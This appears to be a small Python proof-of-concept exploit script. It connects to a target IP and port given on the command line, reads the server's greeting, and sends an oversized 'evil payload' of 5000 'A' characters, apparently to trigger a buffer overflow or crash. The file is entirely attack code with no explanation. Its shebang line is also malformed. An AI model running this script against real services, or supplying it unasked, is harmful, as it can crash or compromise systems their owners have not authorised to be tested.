#/usr/bin/env python

import socket
import sys
import logging

def exploit(ip, port):
    evil="A" * 5000
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    data = s.recv(1024)
    logging.debug("read data from server: " + data)
    logging.info("sending evil payload")
    s.send(evil)
    s.close()


if __name__=="__main__":
    logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.DEBUG, datefmt='%d-%b-%y %H:%M:%S')
    if len(sys.argv) != 3:
        logging.error("usage: " + sys.argv[0] + " ip port")
        sys.exit(-1)
    exploit(sys.argv[1], int(sys.argv[2]))
